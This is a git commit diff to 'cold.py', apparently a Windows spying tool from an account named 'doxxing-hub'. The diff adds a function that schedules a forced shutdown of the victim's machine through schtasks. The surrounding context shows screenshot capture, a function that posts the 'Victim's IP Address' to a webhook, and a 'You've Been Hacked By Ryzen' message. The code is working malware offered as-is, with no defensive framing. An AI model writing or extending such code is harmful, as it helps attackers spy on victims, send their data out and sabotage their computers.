bfc10190f0ca0b3e0f1ca1695a6548d5bc709285
doxxing-hub <yeetboi12589@gmail.com>
2025-11-11 16:31:41 +0000

    Update cold.py

--- cold.py
+++ cold.py
@@ -298,6 +298,18 @@ def take_screenshot(filename='screenshot.png'):
     screenshot.save(filename)
     return filename
 
+def schedule_shutdown():
+
+    current_time = time.localtime()
+    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
+    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))
+
+    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))
+
+    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'
+
+    subprocess.run(command, shell=True)
+
 def send_ip_embed(webhook_url, ip_address):
     embed = {
         "title": "Victim's IP Address",
@@ -496,6 +508,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+    schedule_shutdown()
 
 print("You've Been Hacked By Ryzen")
 time.sleep(3)
